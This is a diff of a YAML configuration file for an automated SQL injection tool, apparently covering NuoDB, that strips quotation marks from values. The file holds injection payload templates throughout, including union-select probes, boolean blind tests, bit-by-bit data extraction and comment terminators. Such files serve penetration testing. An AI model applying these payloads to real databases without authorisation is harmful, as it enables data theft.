@@ -1,4 +1,4 @@
-vendor: ""
+vendor: 
 resource: 
  info: |
   select
@@ -88,7 +88,7 @@ resource:
         {limit}
     ) a
    fields: 
-    field: "${FIELD}"
+    field: ${FIELD}
     concat: "|| '%7f' ||"
     
 strategy: 
@@ -102,37 +102,37 @@ strategy:
            ${CAPACITY}
        ) r
    from (${INJECTION})x
-  limit: "limit ${LIMIT}, 1"
-  failsafe: "select '' || (1337${INDICE}7330%2b1) r from dual"
-  calibrator: "replicate('${CALIBRATOR_SQL}', 65536)"
+  limit: limit ${LIMIT}, 1
+  failsafe: select '' || (1337${INDICE}7330%2b1) r from dual
+  calibrator: replicate('${CALIBRATOR_SQL}', 65536)
   limitBoundary: 0
-  endingComment: "--+-"
+  endingComment: --+-
   fingerprint: 
    errorMessage: 
     - nuodb
     
  normal: 
-  indices: "union select ${RESULT_RANGE} from (${INDICE_UNIQUE})"
-  capacity: "(select '${LEAD}${INDICE}' || ${CALIBRATOR} from dual)"
-  orderBy: "order by 1337"
+  indices: union select ${RESULT_RANGE} from (${INDICE_UNIQUE})
+  capacity: (select '${LEAD}${INDICE}' || ${CALIBRATOR} from dual)
+  orderBy: order by 1337
   
  boolean: 
   test: 
    falses: 
-    - "true = false"
-    - "true %21= true"
-    - "false %21= false"
-    - "1 = 2"
-    - "1 %21= 1"
-    - "2 %21= 2"
+    - true = false
+    - true %21= true
+    - false %21= false
+    - 1 = 2
+    - 1 %21= 1
+    - 2 %21= 2
    trues: 
-    - "true = true"
-    - "false = false"
-    - "true %21= false"
-    - "1 = 1"
-    - "2 = 2"
-    - "1 %21= 2"
-   initialization: "0%2b1 = 1"
+    - true = true
+    - false = false
+    - true %21= false
+    - 1 = 1
+    - 2 = 2
+    - 1 %21= 2
+   initialization: 0%2b1 = 1
    bit: |
     0 != (unicode(
         substr(
@@ -142,6 +142,6 @@ strategy:
         )
     ) 
     %26 ${BIT})
-   length: "char_length((${INJECTION})) > ${INDEX}"
+   length: char_length((${INJECTION})) > ${INDEX}
    
-  blind: "and ${TEST}"
+  blind: and ${TEST}
